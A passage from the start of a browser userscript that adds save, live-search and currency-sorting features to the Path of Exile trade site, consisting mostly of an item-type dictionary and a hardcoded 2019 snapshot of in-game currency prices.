// ==UserScript==
// @name         poe-trade-official-site-enhancer
// @namespace    https://github.com/ghostscript3r/poe-trade-enhancer
// @version      1.4.25
// @description  Adds tons of usefull features to poe.trade, from a very easy to use save manager to save and laod your searches and even live search them all in one page, to an auto sort by real currency values (from poe.ninja), passing from gems max quality cost and more. I have some other very good idea for features to add, I'll gladly push them forward if I see people start using this.
// @author       ghostscript3r@gmail.com | https://www.patreon.com/ghostscripter
// @license      MIT
// @match        https://www.pathofexile.com/trade*
// @require      https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment.min.js
// @require      https://greasyfork.org/scripts/373124-gm4-polyfill-mach6-legacy/code/gm4-polyfill-mach6-legacy.js?version=635792
// @require      https://cdn.jsdelivr.net/npm/lodash@4.17.11/lodash.min.js
// @require      https://unpkg.com/popper.js@1.15.0/dist/umd/popper.min.js
// @require      https://unpkg.com/tippy.js@4.3.5/umd/index.all.min.js
// @require      https://code.jquery.com/jquery-1.11.3.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/async/3.1.0/async.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.2.1/js/bootstrap.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/bootstrap-3-typeahead/4.0.2/bootstrap3-typeahead.min.js
// @resource     fontsCSS https://fonts.googleapis.com/css?family=Oswald|Roboto
// @resource     editableJs https://greasyfork.org/scripts/387585-jqueryeditable/code/jqueryeditable.js?version=717975
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// @grant        GM_getResourceText
// ==/UserScript==



(function() {
  'use strict';

  var namespace="ghost-scripter",ITEM_TYPES={Axe:["Abyssal Axe","Arming Axe","Boarding Axe","Broad Axe","Butcher Axe","Ceremonial Axe","Dagger Axe","Decorative Axe","Despot Axe","Double Axe","Ezomyte Axe","Gilded Axe","Headsman Axe","Infernal Axe","Jasper Axe","Karui Axe","Noble Axe","Reaver Axe","Royal Axe","Shadow Axe","Siege Axe","Spectral Axe","Stone Axe","Sundering Axe","Talon Axe","Timber Axe","Vaal Axe","Void Axe","War Axe","Wraith Axe"],Sceptre:["Abyssal Sceptre","Blood Sceptre","Bronze Sceptre","Carnal Sceptre","Crystal Sceptre","Darkwood Sceptre","Driftwood Sceptre","Horned Sceptre","Iron Sceptre","Karui Sceptre","Lead Sceptre","Ochre Sceptre","Opal Sceptre","Platinum Sceptre","Quartz Sceptre","Ritual Sceptre","Royal Sceptre","Sambar Sceptre","Shadow Sceptre","Stag Sceptre","Vaal Sceptre","Void Sceptre"],Amulet:["Agate Amulet","Amber Amulet","Blue Pearl Amulet","Citrine Amulet","Coral Amulet","Gold Amulet","Jade Amulet","Jet Amulet","Lapis Amulet","Marble Amulet","Onyx Amulet","Paua Amulet","Ruby Amulet","Turquoise Amulet"],Shield:["Alder Spiked Shield","Alloyed Spiked Shield","Ancient Spirit Shield","Angelic Kite Shield","Archon Kite Shield","Baroque Round Shield","Bone Spirit Shield","Branded Kite Shield","Brass Spirit Shield","Bronze Tower Shield","Buckskin Tower Shield","Burnished Spiked Shield","Cardinal Round Shield","Cedar Tower Shield","Ceremonial Kite Shield","Champion Kite Shield","Chiming Spirit Shield","Colossal Tower Shield","Compound Spiked Shield","Copper Tower Shield","Corroded Tower Shield","Crested Tower Shield","Crimson Round Shield","Driftwood Spiked Shield","Ebony Tower Shield","Elegant Round Shield","Etched Kite Shield","Ezomyte Spiked Shield","Ezomyte Tower Shield","Fir Round Shield","Fossilised Spirit Shield","Girded Tower Shield","Harmonic Spirit Shield","Ivory Spirit Shield","Jingling Spirit Shield","Lacewood Spirit Shield","Laminated Kite Shield","Layered Kite Shield","Linden Kite Shield","Mahogany Tower Shield","Maple Round Shield","Mirrored Spiked Shield","Mosaic Kite Shield","Ornate Spiked Shield","Painted Tower Shield","Pinnacle Tower Shield","Plank Kite Shield","Polished Spiked Shield","Rawhide Tower Shield","Redwood Spiked Shield","Reinforced Kite Shield","Reinforced Tower Shield","Rotted Round Shield","Scarlet Round Shield","Shagreen Tower Shield","Sovereign Spiked Shield","Spiked Round Shield","Spiny Round Shield","Splendid Round Shield","Splintered Tower Shield","Steel Kite Shield","Studded Round Shield","Supreme Spiked Shield","Tarnished Spirit Shield","Teak Round Shield","Thorium Spirit Shield","Titanium Spirit Shield","Twig Spirit Shield","Vaal Spirit Shield","Walnut Spirit Shield","Yew Spirit Shield"],Boots:["Ambush Boots","Assassin's Boots","Bronzescale Boots","Carnal Boots","Chain Boots","Clasped Boots","Conjurer Boots","Crusader Boots","Deerskin Boots","Dragonscale Boots","Eelskin Boots","Goathide Boots","Hydrascale Boots","Ironscale Boots","Leatherscale Boots","Legion Boots","Mesh Boots","Murder Boots","Nubuck Boots","Rawhide Boots","Ringmail Boots","Riveted Boots","Scholar Boots","Serpentscale Boots","Shackled Boots","Shagreen Boots","Sharkskin Boots","Slink Boots","Soldier Boots","Sorcerer Boots","Stealth Boots","Steelscale Boots","Strapped Boots","Trapper Boots","Two-Toned Boots","Wrapped Boots","Wyrmscale Boots","Zealot Boots"],Mitts:["Ambush Mitts","Assassin's Mitts","Carnal Mitts","Clasped Mitts","Murder Mitts","Strapped Mitts","Trapper Mitts","Wrapped Mitts"],Ambusher:["Ambusher"],Flask:["Amethyst Flask","Aquamarine Flask","Basalt Flask","Bismuth Flask","Colossal Hybrid Flask","Colossal Life Flask","Colossal Mana Flask","Diamond Flask","Divine Life Flask","Divine Mana Flask","Eternal Life Flask","Eternal Mana Flask","Giant Life Flask","Giant Mana Flask","Grand Life Flask","Grand Mana Flask","Granite Flask","Greater Life Flask","Greater Mana Flask","Hallowed Hybrid Flask","Hallowed Life Flask","Hallowed Mana Flask","Jade Flask","Large Hybrid Flask","Large Life Flask","Large Mana Flask","Medium Hybrid Flask","Medium Life Flask","Medium Mana Flask","Quartz Flask","Quicksilver Flask","Ruby Flask","Sacred Hybrid Flask","Sacred Life Flask","Sacred Mana Flask","Sanctified Life Flask","Sanctified Mana Flask","Sapphire Flask","Silver Flask","Small Hybrid Flask","Small Life Flask","Small Mana Flask","Stibnite Flask","Sulphur Flask","Topaz Flask"],Ring:["Amethyst Ring","Breach Ring","Coral Ring","Diamond Ring","Gold Ring","Iron Ring","Jet Ring","Moonstone Ring","Opal Ring","Paua Ring","Prismatic Ring","Ruby Ring","Sapphire Ring","Steel Ring","Topaz Ring","Two-Stone Ring","Unset Ring"],Club:["Ancestral Club","Barbed Club","Driftwood Club","Petrified Club","Spiked Club","Tribal Club"],Gauntlets:["Ancient Gauntlets","Antique Gauntlets","Bronze Gauntlets","Bronzescale Gauntlets","Dragonscale Gauntlets","Fishscale Gauntlets","Goliath Gauntlets","Hydrascale Gauntlets","Iron Gauntlets","Ironscale Gauntlets","Plated Gauntlets","Serpentscale Gauntlets","Steel Gauntlets","Steelscale Gauntlets","Titan Gauntlets","Vaal Gauntlets","Wyrmscale Gauntlets"],Greaves:["Ancient Greaves","Antique Greaves","Goliath Greaves","Iron Greaves","Kaom's Greaves","Plated Greaves","Reinforced Greaves","Steel Greaves","Titan Greaves","Vaal Greaves"],Sword:["Ancient Sword","Bastard Sword","Battle Sword","Broad Sword","Butcher Sword","Charan's Sword","Copper Sword","Corsair Sword","Courtesan Sword","Dragoon Sword","Elder Sword","Elegant Sword","Eternal Sword","Footman Sword","Gemstone Sword","Graceful Sword","Headman's Sword","Hook Sword","Infernal Sword","Legion Sword","Lion Sword","Ornate Sword","Reaver Sword","Rusted Sword","Spectral Sword","Tiger Sword","Two-Handed Sword","War Sword","Wraith Sword"],Rapier:["Antique Rapier","Apex Rapier","Basket Rapier","Dragonbone Rapier","Harpy Rapier","Primeval Rapier","Thorn Rapier","Vaal Rapier","Whalebone Rapier","Wyrmbone Rapier"],Gloves:["Arcanist Gloves","Chain Gloves","Conjurer Gloves","Crusader Gloves","Deerskin Gloves","Eelskin Gloves","Embroidered Gloves","Fingerless Silk Gloves","Goathide Gloves","Gripped Gloves","Legion Gloves","Mesh Gloves","Nubuck Gloves","Rawhide Gloves","Ringmail Gloves","Riveted Gloves","Samite Gloves","Satin Gloves","Shagreen Gloves","Sharkskin Gloves","Silk Gloves","Slink Gloves","Soldier Gloves","Sorcerer Gloves","Spiked Gloves","Stealth Gloves","Velvet Gloves","Wool Gloves","Zealot Gloves"],Slippers:["Arcanist Slippers","Avian Slippers","Samite Slippers","Satin Slippers","Silk Slippers","Velvet Slippers"],Plate:["Arena Plate","Astral Plate","Battle Plate","Bronze Plate","Colosseum Plate","Copper Plate","Crusader Plate","Full Plate","Gladiator Plate","Glorious Plate","Golden Plate","Kaom's Plate","Lordly Plate","Majestic Plate","Sun Plate","War Plate"],Talisman:["Ashscale Talisman","Avian Twins Talisman","Black Maw Talisman","Bonespire Talisman","Breakrib Talisman","Chrysalis Talisman","Clutching Talisman","Deadhand Talisman","Deep One Talisman","Fangjaw Talisman","Greatwolf Talisman","Hexclaw Talisman","Horned Talisman","Lone Antler Talisman","Longtooth Talisman","Mandible Talisman","Monkey Paw Talisman","Monkey Twins Talisman","Primal Skull Talisman","Rot Head Talisman","Rotfeather Talisman","Spinefuse Talisman","Splitnewt Talisman","Three Hands Talisman","Three Rat Talisman","Undying Flesh Talisman","Wereclaw Talisman","Writhing Talisman"],Bow:["Assassin Bow","Bone Bow","Citadel Bow","Composite Bow","Compound Bow","Crude Bow","Death Bow","Decimation Bow","Decurve Bow","Grove Bow","Harbinger Bow","Highborn Bow","Imperial Bow","Ivory Bow","Long Bow","Maraketh Bow","Ranger Bow","Recurve Bow","Reflex Bow","Royal Bow","Short Bow","Sniper Bow","Spine Bow","Steelwood Bow","Thicket Bow"],Garb:["Assassin's Garb","Cutthroat's Garb","Lacquered Garb","Sacrificial Garb","Sadist Garb","Silken Garb","Thief's Garb","Waxed Garb"],Mace:["Auric Mace","Behemoth Mace","Bladed Mace","Ceremonial Mace","Dragon Mace","Dream Mace","Flanged Mace","Nightmare Mace","Ornate Mace","Phantom Mace","Wyrm Mace"],Helmet:["Aventail Helmet","Barbute Helmet","Bone Helmet","Close Helmet","Cone Helmet","Crusader Helmet","Gladiator Helmet","Great Helmet","Lacquered Helmet","Reaver Helmet","Samite Helmet","Siege Helmet","Soldier Helmet","Zealot Helmet"],Awl:["Awl"],Baselard:["Baselard"],Foil:["Battered Foil","Burnished Foil","Elegant Foil","Fancy Foil","Jagged Foil","Jewelled Foil","Serrated Foil","Spiraled Foil","Tempered Foil"],Helm:["Battered Helm","Fencer Helm","Secutor Helm"],Buckler:["Battle Buckler","Corrugated Buckler","Crusader Buckler","Enameled Buckler","Gilded Buckler","Goathide Buckler","Golden Buckler","Hammered Buckler","Imperial Buckler","Ironwood Buckler","Lacquered Buckler","Oak Buckler","Painted Buckler","Pine Buckler","Vaal Buckler","War Buckler"],Hammer:["Battle Hammer","Legion Hammer","Stone Hammer","War Hammer"],Lamellar:["Battle Lamellar","Field Lamellar","Triumphant Lamellar"],Blinder:["Blinder"],Raiment:["Blood Raiment","Crimson Raiment","Scarlet Raiment"],Quiver:["Blunt Arrow Quiver","Broadhead Arrow Quiver","Conductive Quiver","Cured Quiver","Fire Arrow Quiver","Heavy Quiver","Light Quiver","Penetrating Arrow Quiver","Rugged Quiver","Serrated Arrow Quiver","Sharktooth Arrow Quiver","Spike-Point Arrow Quiver","Two-Point Arrow Quiver"],Armour:["Bone Armour","Carnal Armour","Crypt Armour","Full Scale Armour"],Circlet:["Bone Circlet","Hubris Circlet","Iron Circlet","Lunaris Circlet","Necromancer Circlet","Solaris Circlet","Steel Circlet","Tribal Circlet","Vine Circlet"],Blade:["Boot Blade","Corroded Blade","Curved Blade","Dusk Blade","Exquisite Blade","Ezomyte Blade","Highland Blade","Lithe Blade","Midnight Blade","Twilight Blade","Vaal Blade","Variscite Blade"],Knife:["Boot Knife","Butcher Knife","Carving Knife","Flaying Knife","Gutting Knife","Skinning Knife","Slaughter Knife"],Maul:["Brass Maul","Coronal Maul","Dread Maul","Driftwood Maul","Fright Maul","Imperial Maul","Jagged Maul","Karui Maul","Plated Maul","Solar Maul","Spiny Maul","Terror Maul","Totemic Maul","Tribal Maul"],Tunic:["Buckskin Tunic","Chainmail Tunic","Eelskin Tunic","Sharkskin Tunic"],Regalia:["Cabalist Regalia","Destroyer Regalia","Vaal Regalia"],Mask:["Callous Mask","Deicide Mask","Festival Mask","Golden Mask","Harlequin Mask","Iron Mask","Plague Mask","Raven Mask","Regicide Mask","Scare Mask","Vaal Mask"],Wand:["Carved Wand","Crystal Wand","Driftwood Wand","Engraved Wand","Heathen Wand","Imbued Wand","Omen Wand","Opal Wand","Pagan Wand","Profane Wand","Prophecy Wand","Quartz Wand","Sage Wand","Serpent Wand","Spiraled Wand","Tornado Wand"],Paw:["Cat's Paw","Hellion's Paw","Tiger's Paw"],Belt:["Chain Belt","Cloth Belt","Crystal Belt","Heavy Belt","Leather Belt","Studded Belt","Vanguard Belt"],Hauberk:["Chain Hauberk","Saint's Hauberk"],Doublet:["Chainmail Doublet","Dragonscale Doublet","Scale Doublet","Wyrmscale Doublet"],Vest:["Chainmail Vest","Oiled Vest","Padded Vest","Plate Vest","Scale Vest","Silken Vest"],Splitter:["Chest Splitter"],Chestplate:["Chestplate"],Cleaver:["Cleaver"],Jewel:["Cobalt Jewel","Crimson Jewel","Ghastly Eye Jewel","Hypnotic Eye Jewel","Murderous Eye Jewel","Prismatic Jewel","Searching Eye Jewel","Viridian Jewel"],Staff:["Coiled Staff","Crescent Staff","Eclipse Staff","Ezomyte Staff","Foul Staff","Highborn Staff","Imperial Staff","Iron Staff","Judgement Staff","Long Staff","Maelström Staff","Military Staff","Moon Staff","Primitive Staff","Primordial Staff","Royal Staff","Serpentine Staff","Vile Staff","Woodful Staff"],Mallet:["Colossus Mallet","Great Mallet","Mallet"],Brigandine:["Commander's Brigandine","Desert Brigandine","General's Brigandine","Hussar Brigandine","Infantry Brigandine","Light Brigandine","Soldier's Brigandine"],Vestment:["Conjurer's Vestment","Mage's Vestment","Occultist's Vestment"],Chainmail:["Conquest Chainmail","Crusader Chainmail","Devout Chainmail","Full Chainmail","Holy Chainmail","Saintly Chainmail"],Kris:["Copper Kris","Golden Kris","Platinum Kris"],Leather:["Coronal Leather","Destiny Leather","Exquisite Leather","Frontier Leather","Full Leather","Glorious Leather","Strapped Leather","Sun Leather","Wild Leather","Zodiac Leather"],Cutlass:["Cutlass"],Dagger:["Demon Dagger","Ezomyte Dagger","Fiend Dagger","Imp Dagger","Prong Dagger"],Horn:["Demon's Horn","Faun's Horn","Goat's Horn"],Claw:["Double Claw","Eagle Claw","Fright Claw","Gemini Claw","Great White Claw","Imperial Claw","Noble Claw","Prehistoric Claw","Sharktooth Claw","Sparkling Claw","Terror Claw","Thresher Claw","Timeworn Claw","Twin Claw","Vaal Claw"],Ringmail:["Elegant Ringmail","Full Ringmail","Latticed Ringmail","Loricated Ringmail","Ornate Ringmail"],Greatsword:["Engraved Greatsword","Etched Greatsword","Vaal Greatsword"],Hatchet:["Engraved Hatchet","Etched Hatchet","Jade Hatchet","Runic Hatchet","Rusted Hatchet","Vaal Hatchet"],Estoc:["Estoc"],Burgonet:["Eternal Burgonet","Ezomyte Burgonet","Royal Burgonet"],Gouger:["Eye Gouger","Gouger"],Rod:["Fishing Rod"],Fleshripper:["Fleshripper"],Bascinet:["Fluted Bascinet","Nightmare Bascinet","Pig-Faced Bascinet"],Dragonscale:["Full Dragonscale"],Wyrmscale:["Full Wyrmscale"],Gavel:["Gavel"],Sallet:["Gilded Sallet","Sallet","Visored Sallet"],Gladius:["Gladius"],Shank:["Glass Shank"],Branch:["Gnarled Branch"],Bracers:["Golden Bracers"],Caligae:["Golden Caligae"],Flame:["Golden Flame"],Hoop:["Golden Hoop"],Mantle:["Golden Mantle"],Obi:["Golden Obi"],Wreath:["Golden Wreath"],Grappler:["Grappler"],Crown:["Great Crown","Magistrate Crown","Praetor Crown","Prophet Crown"],Fetish:["Grinning Fetish"],Ripper:["Gut Ripper"],Hood:["Hunter Hood","Leather Hood","Silken Hood"],Skean:["Imperial Skean","Royal Skean","Skean"],Hat:["Iron Hat"],Chopper:["Jade Chopper","Jasper Chopper","Karui Chopper","Wrist Chopper"],Keyblade:["Keyblade"],Labrys:["Labrys"],Lathi:["Lathi"],Cap:["Leather Cap"],Pelt:["Lion Pelt","Ursine Pelt","Wolf Pelt"],Longsword:["Longsword"],Meatgrinder:["Meatgrinder"],Cage:["Mind Cage","Torture Cage"],Star:["Morning Star"],Fist:["Nailed Fist"],Silks:["Necromancer Silks"],Tricorne:["Noble Tricorne","Sinner Tricorne","Tricorne"],Coat:["Oiled Coat","Ringmail Coat","Sleek Coat","Varnished Coat"],Jacket:["Padded Jacket","Quilted Jacket","Sentinel Jacket"],Pecoraro:["Pecoraro"],Pernarch:["Pernarch"],Piledriver:["Piledriver"],Poignard:["Poignard"],Poleaxe:["Poleaxe"],Quarterstaff:["Quarterstaff"],Breaker:["Rock Breaker"],Coif:["Rusted Coif"],Spike:["Rusted Spike"],Sash:["Rustic Sash"],Sabre:["Sabre"],Robe:["Sage's Robe","Savant's Robe","Scholar's Robe","Silk Robe","Simple Robe","Spidersilk Robe","Widowsilk Robe"],Sai:["Sai"],Sekhem:["Sekhem","Tyrant's Sekhem"],Jerkin:["Shabby Jerkin"],Wrap:["Silken Wrap"],Sledgehammer:["Sledgehammer"],Smallsword:["Smallsword"],Bundle:["Spiked Bundle"],Steelhead:["Steelhead"],Stiletto:["Stiletto"],Vise:["Stygian Vise"],Tenderizer:["Tenderizer"],Stabber:["Throat Stabber"],Hook:["Tiger Hook"],Tomahawk:["Tomahawk"],Trisula:["Trisula"],Woodsplitter:["Woodsplitter"],Shoes:["Wool Shoes"]},FIXED_CURRENCY_VALUES=JSON.parse('{"lines":[{"currencyTypeName":"Mirror of Kalandra","pay":{"id":0,"league_id":1,"pay_currency_id":22,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":25,"value":0.0000300679,"data_point_count":1,"includes_secondary":true},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":22,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":21,"value":34056,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,0,0,0,0,0,-0.23],"totalChange":-0.23},"receiveSparkLine":{"data":[0,0.28,0.13,0.57,0.76,0.76,0.76],"totalChange":0.76},"chaosEquivalent":33657.03,"lowConfidencePaySparkLine":{"data":[0,0,0,0,0,0,-0.23],"totalChange":-0.23},"lowConfidenceReceiveSparkLine":{"data":[0,0.28,0.13,0.57,0.76,0.76,0.76],"totalChange":0.76},"detailsId":"mirror-of-kalandra"},{"currencyTypeName":"Eternal Orb","pay":{"id":0,"league_id":1,"pay_currency_id":27,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":2,"value":0.0000479443816,"data_point_count":1,"includes_secondary":true},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":27,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":9,"value":20480.064,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-0.06,-1.41,-6.03,-7.56,-4.16,-8.1],"totalChange":-8.1},"chaosEquivalent":20668.78,"lowConfidencePaySparkLine":{"data":[0,0,20,20,20,-14.29,25.15],"totalChange":25.15},"lowConfidenceReceiveSparkLine":{"data":[0,-0.06,-1.41,-6.03,-7.56,-4.16,-8.1],"totalChange":-8.1},"detailsId":"eternal-orb"},{"currencyTypeName":"Mirror Shard","pay":{"id":0,"league_id":1,"pay_currency_id":81,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":4,"value":0.00083,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":81,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":2,"value":1729.2,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[null,null,null,0,null,null,null],"totalChange":0},"receiveSparkLine":{"data":[],"totalChange":0},"chaosEquivalent":1467.01,"lowConfidencePaySparkLine":{"data":[0,14.29,12.5,10.77,-13.25,-13.25,-13.25],"totalChange":-13.25},"lowConfidenceReceiveSparkLine":{"data":[0,0.29,0,0.76,0.76,-5.71,-5.71],"totalChange":-5.71},"detailsId":"mirror-shard"},{"currencyTypeName":"Blessing of Chayula","pay":{"id":0,"league_id":1,"pay_currency_id":65,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":2,"value":0.00435,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":65,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":34,"value":267.4375,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,3.11,5,2.59,0.7,0.93,2.08],"totalChange":2.08},"chaosEquivalent":248.66,"lowConfidencePaySparkLine":{"data":[0,-1.52,-1.52,-3.47,-6.92,-10.34,-10.34],"totalChange":-10.34},"lowConfidenceReceiveSparkLine":{"data":[0,3.11,5,2.59,0.7,0.93,2.08],"totalChange":2.08},"detailsId":"blessing-of-chayula"},{"currencyTypeName":"Exalted Orb","pay":{"id":0,"league_id":1,"pay_currency_id":2,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":100,"value":0.00769,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":2,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":80,"value":132,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,0.65,0.78,0.78,0.78,0.78,0.78],"totalChange":0.78},"receiveSparkLine":{"data":[0,0.27,0.13,0.57,0.76,0.76,0.76],"totalChange":0.76},"chaosEquivalent":131.02,"lowConfidencePaySparkLine":{"data":[0,0.65,0.78,0.78,0.78,0.78,0.78],"totalChange":0.78},"lowConfidenceReceiveSparkLine":{"data":[0,0.27,0.13,0.57,0.76,0.76,0.76],"totalChange":0.76},"detailsId":"exalted-orb"},{"currencyTypeName":"Divine Orb","pay":{"id":0,"league_id":1,"pay_currency_id":3,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":47,"value":0.03965841379310345,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":3,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":56,"value":26,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,1.21,2.33,0.7,4.18,4.18,5.07],"totalChange":5.07},"receiveSparkLine":{"data":[0,3.85,0.09,0.4,1.85,0,0],"totalChange":0},"chaosEquivalent":25.61,"lowConfidencePaySparkLine":{"data":[0,1.21,2.33,0.7,4.18,4.18,5.07],"totalChange":5.07},"lowConfidenceReceiveSparkLine":{"data":[0,3.85,0.09,0.4,1.85,0,0],"totalChange":0},"detailsId":"divine-orb"},{"currencyTypeName":"Harbinger\'s Orb","pay":{"id":0,"league_id":1,"pay_currency_id":76,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":8,"value":0.04860216494845361,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":76,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":26,"value":24.439393939393938,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-0.18,0.4,0.88,1.97,6.26,3.33],"totalChange":3.33},"receiveSparkLine":{"data":[0,0,0,0,0,0,-2.24],"totalChange":-2.24},"chaosEquivalent":22.51,"lowConfidencePaySparkLine":{"data":[0,-0.18,0.4,0.88,1.97,6.26,3.33],"totalChange":3.33},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,0,-2.24],"totalChange":-2.24},"detailsId":"harbingers-orb"},{"currencyTypeName":"Ancient Orb","pay":{"id":0,"league_id":1,"pay_currency_id":78,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":7,"value":0.05,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":78,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":48,"value":22,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,5.26,5.26,5.26,5.26,5.26,5.26],"totalChange":5.26},"receiveSparkLine":{"data":[0,-0.38,4.82,3.56,0.27,0.27,0.27],"totalChange":0.27},"chaosEquivalent":21,"lowConfidencePaySparkLine":{"data":[0,5.26,5.26,5.26,5.26,5.26,5.26],"totalChange":5.26},"lowConfidenceReceiveSparkLine":{"data":[0,-0.38,4.82,3.56,0.27,0.27,0.27],"totalChange":0.27},"detailsId":"ancient-orb"},{"currencyTypeName":"Orb of Annulment","pay":{"id":0,"league_id":1,"pay_currency_id":73,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":20,"value":0.06667,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":73,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":44,"value":18.8588,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,1.8,7.28,3.94,4.94,14.29,7.14],"totalChange":7.14},"receiveSparkLine":{"data":[0,3.62,15.44,15.81,15.24,15.81,14.95],"totalChange":14.95},"chaosEquivalent":16.93,"lowConfidencePaySparkLine":{"data":[0,1.8,7.28,3.94,4.94,14.29,7.14],"totalChange":7.14},"lowConfidenceReceiveSparkLine":{"data":[0,3.62,15.44,15.81,15.24,15.81,14.95],"totalChange":14.95},"detailsId":"orb-of-annulment"},{"currencyTypeName":"Blessing of Uul-Netol","pay":{"id":0,"league_id":1,"pay_currency_id":64,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":0.16667,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":64,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":9,"value":9.350515463917526,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-30.77,-34,-15.58,-29.53,-24.46,-28.07],"totalChange":-28.07},"chaosEquivalent":7.68,"lowConfidencePaySparkLine":{"data":[null,null,0,33.33,66.66,66.66,99.99],"totalChange":99.99},"lowConfidenceReceiveSparkLine":{"data":[0,-30.77,-34,-15.58,-29.53,-24.46,-28.07],"totalChange":-28.07},"detailsId":"blessing-of-uul-netol"},{"currencyTypeName":"Exalted Shard","pay":{"id":0,"league_id":1,"pay_currency_id":80,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":6,"value":0.16667,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":80,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":11,"value":7,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,0,null,null,0,0,0],"totalChange":0},"receiveSparkLine":{"data":[0,-11.74,-11.79,2.91,2.91,2.91,2.91],"totalChange":2.91},"chaosEquivalent":6.5,"lowConfidencePaySparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,-11.74,-11.79,2.91,2.91,2.91,2.91],"totalChange":2.91},"detailsId":"exalted-shard"},{"currencyTypeName":"Master Cartographer\'s Sextant","pay":{"id":0,"league_id":1,"pay_currency_id":48,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":20,"value":0.24879285714285715,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":48,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":64,"value":4.911668875,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,3.39,3.39,3.39,3.39,3.39,3.89],"totalChange":3.89},"receiveSparkLine":{"data":[0,0,0,18.72,22.5,15.17,22.79],"totalChange":22.79},"chaosEquivalent":4.47,"lowConfidencePaySparkLine":{"data":[0,3.39,3.39,3.39,3.39,3.39,3.89],"totalChange":3.89},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,18.72,22.5,15.17,22.79],"totalChange":22.79},"detailsId":"master-cartographers-sextant"},{"currencyTypeName":"Blessing of Esh","pay":{"id":0,"league_id":1,"pay_currency_id":63,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":0.5,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":63,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":23,"value":4,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"chaosEquivalent":3,"lowConfidencePaySparkLine":{"data":[null,null,0,100,100,100,100],"totalChange":100},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"detailsId":"blessing-of-esh"},{"currencyTypeName":"Journeyman Cartographer\'s 